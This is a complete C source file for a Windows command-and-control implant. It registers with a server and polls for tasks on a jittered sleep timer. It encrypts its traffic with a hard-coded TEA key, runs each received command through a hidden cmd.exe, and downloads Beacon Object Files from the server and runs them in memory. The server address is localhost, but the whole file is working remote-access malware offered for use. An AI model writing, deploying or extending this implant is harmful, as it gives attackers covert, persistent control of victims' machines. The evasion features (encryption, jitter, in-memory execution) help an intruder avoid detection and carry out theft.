#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <bcrypt.h>

#include "COFFLoader.h"
#include "beacon_compatibility.h"

// ---------------------------------------------------------------------------
// TEA CTR encryption (8-byte nonce, 16-byte key)
// ---------------------------------------------------------------------------
static const uint8_t ENC_KEY[16] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
};

#define TEA_DELTA 0x9e3779b9
static void tea_encrypt(uint32_t *v, const uint32_t *k) {
    uint32_t sum = 0;
    for (int i = 0; i < 32; i++) {
        sum += TEA_DELTA;
        v[0] += ((v[1] << 4) + k[0]) ^ (v[1] + sum) ^ ((v[1] >> 5) + k[1]);
        v[1] += ((v[0] << 4) + k[2]) ^ (v[0] + sum) ^ ((v[0] >> 5) + k[3]);
    }
}

static void tea_ctr_xor(const uint8_t *key, uint64_t nonce, uint64_t counter,
                        const uint8_t *in, uint8_t *out, size_t len) {
    uint32_t k[4];
    for (int i = 0; i < 4; i++)
        k[i] = ((uint32_t*)key)[i];
    uint64_t ctr = nonce + counter;
    uint8_t stream[8];
    for (size_t off = 0; off < len; off += 8) {
        uint64_t val = ctr++;
        ((uint64_t*)stream)[0] = val;
        tea_encrypt((uint32_t*)stream, k);
        size_t rem = len - off;
        for (size_t i = 0; i < rem && i < 8; i++)
            out[off + i] = in[off + i] ^ stream[i];
    }
}

static void gen_random_nonce(uint8_t *nonce, size_t len) {
    BCRYPT_ALG_HANDLE hAlg;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0) == 0) {
        BCryptGenRandom(hAlg, nonce, (ULONG)len, 0);
        BCryptCloseAlgorithmProvider(hAlg, 0);
    } else {
        for (size_t i = 0; i < len; i++)
            nonce[i] = (uint8_t)(rand() & 0xFF);
    }
}

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------
#define SERVER_IP       "127.0.0.1"
#define SERVER_PORT     8080
#define USER_AGENT      "Mozilla/5.0"

#define OUTPUT_BUF_SIZE  (256 * 1024)
#define HTTP_BUF_SIZE    (512 * 1024)
#define CMD_BUF_SIZE     4096
#define PATH_BUF_SIZE    512
#define AGENT_ID_SIZE    256

#define SLEEP_BASE_MS    5000
#define SLEEP_JITTER_MS  3000

// ---------------------------------------------------------------------------
// Output buffer
// ---------------------------------------------------------------------------
static char *beacon_buf     = NULL;
static int   beacon_buf_pos = 0;
static int   beacon_buf_cap = 0;
static char cwd[MAX_PATH] = {0};

static void buf_append(const char *data, int len) {
    if (!beacon_buf) return;
    if (beacon_buf_pos + len >= beacon_buf_cap) {
        const char *msg = "[!] Output buffer full — truncated\n";
        int msglen = (int)strlen(msg);
        if (beacon_buf_pos + msglen < beacon_buf_cap) {
            memcpy(beacon_buf + beacon_buf_pos, msg, msglen);
            beacon_buf_pos += msglen;
        }
        return;
    }
    memcpy(beacon_buf + beacon_buf_pos, data, len);
    beacon_buf_pos += len;
}

static void buf_reset(void) {
    beacon_buf_pos = 0;
    if (beacon_buf) memset(beacon_buf, 0, beacon_buf_cap);
}

void beacon_log(const char *fmt, ...) {
    if (!beacon_buf) return;
    char tmp[2048];
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, args);
    va_end(args);
    if (n > 0) buf_append(tmp, n);
}

// ---------------------------------------------------------------------------
// Encrypted HTTP (8-byte nonce, TEA-CTR)
// ---------------------------------------------------------------------------
static int send_http_post_encrypted(const char *host, int port, const char *path,
                                    const uint8_t *plain_data, int plain_len,
                                    uint8_t **out_plain, int *out_plain_len) {
    SOCKET sockfd;
    struct sockaddr_in server_addr;
    char request[1024];
    int total_bytes = 0, bytes;
    uint8_t *enc_body = NULL;
    int enc_body_len = 0;
    uint8_t *response = NULL;
    size_t resp_size = HTTP_BUF_SIZE;
    int ret = -1;

    // Encrypt with 8-byte nonce
    uint8_t nonce[8];
    gen_random_nonce(nonce, sizeof(nonce));
    enc_body_len = plain_len + 8;
    enc_body = (uint8_t*)malloc(enc_body_len);
    if (!enc_body) goto cleanup;
    memcpy(enc_body, nonce, 8);
    if (plain_len > 0) {
        tea_ctr_xor(ENC_KEY, *(uint64_t*)nonce, 0, plain_data, enc_body + 8, plain_len);
    }

    // TCP connect & send
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        goto cleanup;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = htons(port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
        goto cleanup;

    snprintf(request, sizeof(request),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %d\r\n\r\n",
        path, host, port, USER_AGENT, enc_body_len);
    if (send(sockfd, request, (int)strlen(request), 0) == SOCKET_ERROR)
        goto cleanup;
    if (send(sockfd, (const char*)enc_body, enc_body_len, 0) == SOCKET_ERROR)
        goto cleanup;

    // Receive response
    response = (uint8_t*)malloc(resp_size);
    if (!response) goto cleanup;
    while (total_bytes < (int)(resp_size - 1)) {
        bytes = recv(sockfd, (char*)response + total_bytes,
                     (int)(resp_size - total_bytes - 1), 0);
        if (bytes == SOCKET_ERROR || bytes == 0) break;
        total_bytes += bytes;
    }
    response[total_bytes] = '\0';

    // Extract body and decrypt
    char *body = strstr((char*)response, "\r\n\r\n");
    if (!body) goto cleanup;
    body += 4;
    int body_len = total_bytes - (body - (char*)response);
    if (body_len < 8) goto cleanup;
    uint64_t resp_nonce = *(uint64_t*)body;
    int cipher_len = body_len - 8;
    uint8_t *plain = (uint8_t*)malloc(cipher_len + 1);
    if (!plain) goto cleanup;
    if (cipher_len > 0) {
        tea_ctr_xor(ENC_KEY, resp_nonce, 0, (uint8_t*)body + 8, plain, cipher_len);
    }
    plain[cipher_len] = '\0';

    *out_plain = plain;
    *out_plain_len = cipher_len;
    ret = 0;

cleanup:
    if (sockfd != INVALID_SOCKET) closesocket(sockfd);
    free(enc_body);
    free(response);
    if (ret != 0) {
        *out_plain = NULL;
        *out_plain_len = 0;
    }
    return ret;
}

// ---------------------------------------------------------------------------
// BOF execution
// ---------------------------------------------------------------------------
int execute_bof(unsigned char *bof_data, size_t bof_size,
                char *args, int args_len) {
    char *coff_args = malloc(args_len + 4);
    if (!coff_args) return 1;
    *(DWORD *)coff_args = (DWORD)args_len;
    if (args_len > 0)
        memcpy(coff_args + 4, args, args_len);
    int result = RunCOFF("go", bof_data, bof_size, (unsigned char*)coff_args, args_len);
    int output_size = 0;
    char *bof_output = BeaconGetOutputData(&output_size);
    if (bof_output && output_size > 0) {
        buf_append(bof_output, output_size);
        free(bof_output);
    }
    free(coff_args);
    return result;
}

// ---------------------------------------------------------------------------
// cd & shell command handling (identical to your working version)
// ---------------------------------------------------------------------------
static void handle_cd(const char *target) {
    char new_path[MAX_PATH];
    if (!target || target[0] == '\0' ||
        (target[0] == '~' && target[1] == '\0')) {
        const char *home = getenv("USERPROFILE");
        if (!home) home = "C:\\";
        strncpy(new_path, home, MAX_PATH - 1);
        new_path[MAX_PATH - 1] = '\0';
    } else {
        if (target[1] == ':' || target[0] == '\\') {
            strncpy(new_path, target, MAX_PATH - 1);
            new_path[MAX_PATH - 1] = '\0';
        } else {
            snprintf(new_path, MAX_PATH, "%s\\%s", cwd, target);
        }
    }
    DWORD attr = GetFileAttributesA(new_path);
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        beacon_log("cd: directory not found: %s\n", new_path);
        return;
    }
    char resolved[MAX_PATH];
    if (!GetFullPathNameA(new_path, MAX_PATH, resolved, NULL)) {
        beacon_log("cd: could not resolve path\n");
        return;
    }
    strncpy(cwd, resolved, MAX_PATH - 1);
    cwd[MAX_PATH - 1] = '\0';
    SetCurrentDirectoryA(cwd);
    beacon_log("%s\n", cwd);
}

void execute_shell_command(const char *command) {
    if (strncmp(command, "cd", 2) == 0 &&
        (command[2] == ' ' || command[2] == '\0')) {
        const char *target = (command[2] == ' ') ? command + 3 : "";
        handle_cd(target);
        return;
    }
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        beacon_log("[!] CreatePipe failed: %lu\n", GetLastError());
        return;
    }
    STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;
    PROCESS_INFORMATION pi;
    char cmd_line[CMD_BUF_SIZE + 32];
    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /c %s", command);
    if (CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL,
                       cwd[0] ? cwd : NULL, &si, &pi)) {
        CloseHandle(hWrite);
        if (WaitForSingleObject(pi.hProcess, 30000) == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
            beacon_log("[!] Command timed out\n");
        } else {
            DWORD bytes_read;
            char tmp[4096];
            while (ReadFile(hRead, tmp, sizeof(tmp) - 1, &bytes_read, NULL) && bytes_read > 0) {
                tmp[bytes_read] = '\0';
                buf_append(tmp, (int)bytes_read);
            }
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hRead);
    } else {
        beacon_log("[!] Failed to execute: %lu\n", GetLastError());
        CloseHandle(hWrite);
        CloseHandle(hRead);
    }
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int main(void) {
    WSADATA wsa;
    char agent_id[AGENT_ID_SIZE] = {0};
    srand((unsigned int)GetTickCount());
    beacon_buf     = calloc(OUTPUT_BUF_SIZE, 1);
    beacon_buf_cap = OUTPUT_BUF_SIZE;
    if (!beacon_buf) return 1;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        free(beacon_buf);
        return 1;
    }
    GetCurrentDirectoryA(MAX_PATH, cwd);

    // Registration
    uint8_t *reg_response = NULL;
    int reg_len = 0;
    if (send_http_post_encrypted(SERVER_IP, SERVER_PORT, "/register",
                                 NULL, 0, &reg_response, &reg_len) == 0 && reg_response) {
        if (reg_len > 0) {
            strncpy(agent_id, (char*)reg_response, AGENT_ID_SIZE - 1);
            agent_id[AGENT_ID_SIZE - 1] = '\0';
            char *nl;
            if ((nl = strchr(agent_id, '\r'))) *nl = '\0';
            if ((nl = strchr(agent_id, '\n'))) *nl = '\0';
        }
        free(reg_response);
    }
    if (agent_id[0] == '\0') {
        WSACleanup();
        free(beacon_buf);
        return 1;
    }

    // Initial checkin
    char path[PATH_BUF_SIZE];
    snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);
    uint8_t *checkin_resp = NULL;
    int resp_len = 0;
    send_http_post_encrypted(SERVER_IP, SERVER_PORT, path,
                             (uint8_t*)beacon_buf, beacon_buf_pos,
                             &checkin_resp, &resp_len);
    free(checkin_resp);
    buf_reset();

    // Main loop
    while (1) {
        snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);
        uint8_t *cmd_plain = NULL;
        int cmd_len = 0;
        if (send_http_post_encrypted(SERVER_IP, SERVER_PORT, path,
                                     (uint8_t*)beacon_buf, beacon_buf_pos,
                                     &cmd_plain, &cmd_len) == 0 && cmd_plain) {
            buf_reset();
            if (cmd_len > 0) {
                char safe_cmd[CMD_BUF_SIZE];
                strncpy(safe_cmd, (char*)cmd_plain, CMD_BUF_SIZE - 1);
                safe_cmd[CMD_BUF_SIZE - 1] = '\0';
                char *end = safe_cmd + strlen(safe_cmd) - 1;
                while (end >= safe_cmd && (*end == '\r' || *end == '\n' || *end == ' '))
                    *end-- = '\0';
                if (safe_cmd[0] != '\0') {
                    if (strncmp(safe_cmd, "BOF:", 4) == 0) {
                        char *bof_name = safe_cmd + 4;
                        char *args_hex = strchr(bof_name, ':');
                        if (args_hex) {
                            *args_hex++ = '\0';
                            uint8_t *bof_data = NULL;
                            int bof_len = 0;
                            char bof_path[PATH_BUF_SIZE];
                            snprintf(bof_path, PATH_BUF_SIZE, "/getbof/%s/%s", agent_id, bof_name);
                            if (send_http_post_encrypted(SERVER_IP, SERVER_PORT, bof_path,
                                                         NULL, 0, &bof_data, &bof_len) == 0 && bof_data) {
                                int hex_len = (int)strlen(args_hex);
                                int args_len = hex_len / 2;
                                char *args = malloc(args_len + 1);
                                if (args) {
                                    for (int i = 0; i < args_len; i++) {
                                        unsigned int tmp_byte;
                                        sscanf(args_hex + i * 2, "%2x", &tmp_byte);
                                        args[i] = (char)tmp_byte;
                                    }
                                    execute_bof(bof_data, bof_len, args, args_len);
                                    free(args);
                                }
                                free(bof_data);
                            }
                        }
                    } else {
                        execute_shell_command(safe_cmd);
                    }
                }
            }
            free(cmd_plain);
        } else {
            buf_reset();
        }
        DWORD sleep_ms = SLEEP_BASE_MS + (rand() % (SLEEP_JITTER_MS * 2)) - SLEEP_JITTER_MS;
        if (sleep_ms < 1000) sleep_ms = 1000;
        Sleep(sleep_ms);
    }
    WSACleanup();
    free(beacon_buf);
    return 0;
}